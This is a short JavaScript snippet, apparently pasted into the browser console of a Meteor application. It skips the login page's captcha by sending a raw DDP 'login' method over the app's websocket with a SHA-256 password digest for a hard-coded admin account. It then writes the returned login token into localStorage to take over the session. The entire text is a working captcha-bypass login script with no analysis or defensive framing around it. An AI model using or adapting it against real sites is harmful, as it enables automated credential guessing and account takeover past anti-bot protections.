const email = "admin@foo.com";
const password = "password";

async function sha256(message) {
  const msgBuffer = new TextEncoder().encode(message);
  const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
  const hashArray = Array.from(new Uint8Array(hashBuffer));
  return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
}

const passwordHash = await sha256(password);

function callback(obj){
    let data = JSON.parse(obj.data);
    if (data.msg === "result" && data.id === "99822") {
        console.log("Captcha bypassed successfully:", data.result);
        localStorage.setItem('Meteor.loginToken', data.result.token);
        localStorage.setItem('Meteor.userId', data.result.id);
        window.location.reload();
    }
}

Meteor.connection._stream.socket.onmessage = callback;

Meteor.connection._stream.socket.send("{\"msg\":\"method\",\"id\":\"99822\",\"method\":\"login\",\"params\":[{\"user\":{\"email\":\""+email+"\"},\"password\":{\"digest\":\""+passwordHash+"\",\"algorithm\":\"sha-256\"}}]}") 